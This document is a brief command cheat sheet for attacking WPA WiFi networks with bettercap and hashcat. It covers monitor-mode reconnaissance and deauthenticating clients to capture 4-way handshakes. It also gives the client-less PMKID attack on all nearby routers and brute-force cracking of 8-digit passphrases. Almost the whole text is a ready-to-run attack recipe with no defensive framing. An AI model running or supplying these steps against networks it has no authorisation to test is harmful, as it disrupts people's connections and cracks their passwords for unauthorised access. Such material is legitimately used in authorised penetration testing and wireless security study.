## 4 way handshake capture:

```
sudo bettercap -iface wlan0

# this will set the interface in monitor mode and start channel hopping on all supported frequencies
> wifi.recon on
# we want our APs sorted by number of clients for this attack, the default sorting would be `rssi asc`
> set wifi.show.sort clients desc
# every second, clear our view and present an updated list of nearby WiFi networks
> set ticker.commands 'clear; wifi.show'
> ticker on
```

```
wifi.recon.channel 1
```

```
wifi.deauth e0:xx:xx:xx:xx:xx
```

## Cracking 4-way handshake

```
/path/to/cap2hccapx /root/bettercap-wifi-handshakes.pcap bettercap-wifi-handshakes.hccapx
/path/to/hashcat -m2500 -a3 -w3 bettercap-wifi-handshakes.hccapx '?d?d?d?d?d?d?d?d'
```

## Client-less PMKID Attack

> <https://hashcat.net/forum/thread-7717.html>

> PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)

```
# wifi.assoc supports 'all' (or `*`) or a specific BSSID, just like wifi.deauth
> wifi.assoc all
```

All nearby vulnerable routers (and let me reiterate: a lot of them are vulnerable), will start sending you the PMKID, which bettercap will dump to the usual pcap file:

## PMKID Cracking

```
/path/to/hcxpcaptool -z bettercap-wifi-handshakes.pmkid /root/bettercap-wifi-handshakes.pcap
/path/to/hashcat -m16800 -a3 -w3 bettercap-wifi-handshakes.pmkid '?d?d?d?d?d?d?d?d'
```